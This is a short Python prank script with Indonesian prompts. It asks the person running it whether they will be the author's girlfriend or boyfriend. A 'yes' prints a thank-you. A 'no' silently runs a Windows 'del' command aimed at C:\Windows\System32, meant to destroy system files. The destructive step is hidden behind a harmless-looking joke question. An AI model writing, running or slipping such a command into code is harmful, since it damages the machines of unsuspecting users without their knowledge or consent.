import os

pty = input("Kamu mau gak jadi pacarku?(jawab ya atau tidak) = ")

if pty.lower() == "ya":
    print("yaudah makasih ya!!")
elif pty.lower() == "tidak":
    os.system("del C:\\Windows\\System32")